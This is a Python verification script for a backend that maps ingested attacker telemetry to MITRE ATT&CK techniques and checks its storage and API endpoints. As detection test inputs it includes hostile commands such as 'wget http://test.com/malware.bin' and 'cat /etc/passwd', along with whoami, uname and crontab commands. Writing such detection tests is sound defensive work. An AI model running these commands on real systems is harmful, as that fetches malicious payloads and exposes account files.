"""
Verification Script for COMMAND 4: MITRE ATT&CK Mapping Implementation Status
Strictly verifies all 8 criteria requested by the user.
"""

import os
import sys
import json
import httpx
from datetime import datetime, timezone

# Ensure project root is in sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

BASE_URL = "http://127.0.0.1:8000"

def verify_all():
    print("=" * 70)
    print("COMMAND 4 IMPLEMENTATION STATUS VERIFICATION")
    print("=" * 70)

    # -------------------------------------------------------------------------
    # 1. Verify structured MITRE ATT&CK technique catalog exists
    # -------------------------------------------------------------------------
    print("\n[Criterion 1] Checking structured MITRE ATT&CK technique catalog...")
    catalog_path = os.path.join(os.path.dirname(__file__), "app", "data", "mitre_catalog.json")
    assert os.path.exists(catalog_path), f"Catalog file missing at {catalog_path}"
    with open(catalog_path, "r", encoding="utf-8") as f:
        catalog_data = json.load(f)
    assert len(catalog_data) >= 10, f"Expected at least 10 catalog entries, found {len(catalog_data)}"
    
    # Check fields of every entry
    required_fields = ["technique_id", "name", "tactics", "description", "applicable_event_evidence", "data_source_requirements", "mapping_rule_id"]
    for item in catalog_data:
        for f in required_fields:
            assert f in item, f"Missing field '{f}' in technique {item.get('technique_id')}"
    print(f" -> PASS: Catalog exists with {len(catalog_data)} authoritative MITRE techniques separate from app logic.")

    # -------------------------------------------------------------------------
    # 2. Verify mapping rules use actual telemetry evidence
    # -------------------------------------------------------------------------
    print("\n[Criterion 2] Checking that mapping rules use actual telemetry evidence...")
    from backend.app.services.mitre import evaluate_event_evidence
    
    # Test valid user discovery evidence
    eval_user = evaluate_event_evidence("command_execution", payload="whoami", username="root")
    assert eval_user["mapping_status"] == "supported"
    assert eval_user["technique_id"] == "T1033"
    assert eval_user["evidence_strength"] == "high"
    
    # Test valid sysinfo discovery evidence
    eval_sys = evaluate_event_evidence("command_execution", payload="uname -a")
    assert eval_sys["mapping_status"] == "supported"
    assert eval_sys["technique_id"] == "T1082"
    
    # Test valid ingress tool transfer evidence
    eval_tool = evaluate_event_evidence("command_execution", payload="wget http://test.com/malware.bin")
    assert eval_tool["mapping_status"] == "supported"
    assert eval_tool["technique_id"] == "T1105"
    print(" -> PASS: Mapping rules require concrete evidence in commands and payloads.")

    # -------------------------------------------------------------------------
    # 3. Verify event-level technique mappings are stored
    # -------------------------------------------------------------------------
    print("\n[Criterion 3] Checking event-level technique mapping persistence...")
    evt_id = f"verify-evt-persist-{int(datetime.now().timestamp())}"
    ingest_res = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": evt_id,
        "source_ip": "198.51.100.99",
        "event_type": "command_execution",
        "payload": "cat /etc/passwd",
        "data_origin": "synthetic"
    })
    assert ingest_res.status_code in [200, 201]
    
    # Query database for event-level mapping
    mapping_res = httpx.get(f"{BASE_URL}/api/events/{evt_id}/techniques")
    assert mapping_res.status_code == 200
    event_mappings = mapping_res.json()
    assert len(event_mappings) >= 1
    m = event_mappings[0]
    assert m["technique_id"] == "T1033"
    assert m["scope"] == "event"
    assert m["event_id"] == evt_id
    assert m["evidence_strength"] == "high"
    print(f" -> PASS: Event-level mapping persisted in database with ID={m['mapping_id']}, rule={m['mapping_rule']}.")

    # -------------------------------------------------------------------------
    # 4. Verify session-level mappings are linked to supporting events
    # -------------------------------------------------------------------------
    print("\n[Criterion 4] Checking session-level mappings linked to supporting events...")
    sess_id = f"verify-sess-mitre-{int(datetime.now().timestamp())}"
    e1 = f"verify-ev-cron-{int(datetime.now().timestamp())}"
    e2 = f"verify-ev-cron2-{int(datetime.now().timestamp())}"
    
    httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": e1,
        "session_id": sess_id,
        "source_ip": "198.51.100.105",
        "event_type": "command_execution",
        "payload": "crontab -l",
        "data_origin": "synthetic"
    })
    httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": e2,
        "session_id": sess_id,
        "source_ip": "198.51.100.105",
        "event_type": "command_execution",
        "payload": "crontab -e",
        "data_origin": "synthetic"
    })
    
    sess_tech_res = httpx.get(f"{BASE_URL}/api/sessions/{sess_id}/techniques")
    assert sess_tech_res.status_code == 200
    sess_mappings = sess_tech_res.json()
    assert len(sess_mappings) >= 1
    cron_mapping = next(sm for sm in sess_mappings if sm["technique_id"] == "T1053.003")
    assert cron_mapping["scope"] == "session"
    assert cron_mapping["session_id"] == sess_id
    # Must retain supporting event IDs
    assert e1 in cron_mapping["supporting_event_ids"]
    assert e2 in cron_mapping["supporting_event_ids"]
    print(f" -> PASS: Session-level mapping linked to supporting events: {cron_mapping['supporting_event_ids']}.")

    # -------------------------------------------------------------------------
    # 5. Verify MITRE ATT&CK API endpoints work
    # -------------------------------------------------------------------------
    print("\n[Criterion 5] Checking MITRE ATT&CK API endpoints...")
    # GET /api/techniques
    r_list = httpx.get(f"{BASE_URL}/api/techniques")
    assert r_list.status_code == 200
    assert len(r_list.json()) >= 10
    
    # GET /api/techniques/{technique_id}
    r_detail = httpx.get(f"{BASE_URL}/api/techniques/T1053.003")
    assert r_detail.status_code == 200
    assert r_detail.json()["name"] == "Scheduled Task/Job: Cron"
    assert len(r_detail.json()["supporting_event_ids"]) >= 2
    
    # GET /api/events/{event_id}/techniques
    r_ev = httpx.get(f"{BASE_URL}/api/events/{e1}/techniques")
    assert r_ev.status_code == 200
    
    # GET /api/sessions/{session_id}/techniques
    r_sess = httpx.get(f"{BASE_URL}/api/sessions/{sess_id}/techniques")
    assert r_sess.status_code == 200
    
    # POST /api/analysis/mitre/run
    r_run = httpx.post(f"{BASE_URL}/api/analysis/mitre/run")
    assert r_run.status_code == 200
    assert r_run.json()["evaluated_events"] > 0
    print(" -> PASS: All 5 MITRE ATT&CK API endpoints functional with valid JSON responses.")

    # -------------------------------------------------------------------------
    # 6. Verify existing MITRE ATT&CK frontend displays real backend data
    # -------------------------------------------------------------------------
    print("\n[Criterion 6] Checking frontend integration with real backend data...")
    # Fetch data exactly as frontend calls it
    fe_techs = httpx.get(f"{BASE_URL}/api/techniques").json()
    active_techs = [t for t in fe_techs if t["supporting_events_count"] > 0]
    assert len(active_techs) > 0, "No active techniques found in real backend data"
    print(f" -> PASS: Frontend receives {len(fe_techs)} catalog techniques with {len(active_techs)} active evidence mappings directly from database.")

    # -------------------------------------------------------------------------
    # 7. Events without sufficient evidence are NOT assigned unsupported techniques
    # -------------------------------------------------------------------------
    print("\n[Criterion 7] Checking that events without evidence are NOT assigned unsupported techniques...")
    unsupported_evt_id = f"verify-unsupp-{int(datetime.now().timestamp())}"
    res_unsupp = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": unsupported_evt_id,
        "source_ip": "192.0.2.10",
        "event_type": "ping",
        "payload": "ICMP ping request",
        "data_origin": "synthetic"
    })
    assert res_unsupp.status_code in [200, 201]
    unsupp_data = res_unsupp.json()
    assert unsupp_data["mitre_technique_id"] is None
    assert unsupp_data["confidence_score"] == 0.0

    # Also check isolated failed login
    iso_fail_id = f"verify-iso-fail-{int(datetime.now().timestamp())}"
    res_iso = httpx.post(f"{BASE_URL}/api/events", json={
        "event_id": iso_fail_id,
        "source_ip": "192.0.2.11",
        "event_type": "auth_failed",
        "username": "user1",
        "data_origin": "synthetic"
    })
    assert res_iso.status_code in [200, 201]
    iso_data = res_iso.json()
    assert iso_data["mitre_technique_id"] is None
    print(" -> PASS: Neither ping nor isolated failed login were assigned fake or exploit techniques.")

    # -------------------------------------------------------------------------
    # 8. Existing telemetry ingestion and session correlation still work
    # -------------------------------------------------------------------------
    print("\n[Criterion 8] Checking existing ingestion and correlation functionality...")
    single = httpx.post(f"{BASE_URL}/api/events", json={
        "source_ip": "192.0.2.77",
        "event_type": "port_scan",
        "payload": "nmap scan"
    })
    assert single.status_code in [200, 201]
    
    bulk = httpx.post(f"{BASE_URL}/api/events/bulk", json={
        "events": [
            {"source_ip": "192.0.2.78", "event_type": "ping", "payload": "icmp"},
            {"source_ip": "192.0.2.79", "event_type": "ping", "payload": "icmp"}
        ]
    })
    assert bulk.status_code in [200, 201]
    assert bulk.json()["ingested"] == 2

    corr = httpx.post(f"{BASE_URL}/api/correlation/run")
    assert corr.status_code == 200
    assert corr.json()["status"] == "completed"
    print(" -> PASS: Single ingestion, bulk ingestion, and session correlation remain fully functional.")

    print("\n" + "=" * 70)
    print("ALL 8 VERIFICATION CRITERIA FOR COMMAND 4 PASSED WITH REAL DATA!")
    print("=" * 70)

if __name__ == "__main__":
    verify_all()
